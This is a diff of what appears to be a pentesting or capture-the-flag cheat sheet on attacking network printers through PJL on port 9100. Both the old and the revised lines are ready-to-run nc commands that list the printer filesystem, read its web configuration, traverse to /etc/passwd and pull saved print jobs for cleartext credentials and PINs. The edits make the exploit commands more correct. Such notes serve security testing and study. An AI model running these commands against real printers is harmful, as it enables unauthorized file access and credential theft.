@@ -66,17 +66,18 @@ PJL (Printer Job Language) is exposed on TCP 9100 or via HTTP-based printer mana
 nmap -p 9100,515,631 <target>
 
 # PJL filesystem enumeration via raw TCP or HTTP POST form
-echo '@PJL FSDIRLIST NAME="0:" ENTRY=1 COUNT=50' | nc <target> 9100
+echo '@PJL FSDIRLIST NAME="0:\" ENTRY=1 COUNT=65535' | nc <target> 9100
 
-# Read a file via PJL FSUPLOAD
-echo '@PJL FSUPLOAD NAME="0:/webServer/default/csconfig" SIZE=4520' | nc <target> 9100
+# Read a file via PJL FSUPLOAD (OFFSET and SIZE both required by HP spec)
+echo '@PJL FSQUERY NAME="0:/webServer/default/csconfig"' | nc <target> 9100    # get size first
+echo '@PJL FSUPLOAD NAME="0:/webServer/default/csconfig" OFFSET=0 SIZE=4520' | nc <target> 9100
 
 # Path traversal: 0: maps to /printer or /hpmnt on the host
-echo '@PJL FSUPLOAD NAME="0:/../../etc/passwd" SIZE=500' | nc <target> 9100
+echo '@PJL FSUPLOAD NAME="0:/../../etc/passwd" OFFSET=0 SIZE=65535' | nc <target> 9100
 
-# List saved print jobs — may contain cleartext credentials, PINs, flag comments
+# List saved print jobs — @PJL COMMENT / @PJL SET fields often carry cleartext creds or PINs
 echo '@PJL FSDIRLIST NAME="0:/../../home/default/" ENTRY=1 COUNT=50' | nc <target> 9100
-echo '@PJL FSUPLOAD NAME="0:/../../home/default/readyjob" SIZE=500' | nc <target> 9100
+echo '@PJL FSUPLOAD NAME="0:/../../home/default/readyjob" OFFSET=0 SIZE=65535' | nc <target> 9100
 ```
 
 Key PJL targets after traversal:
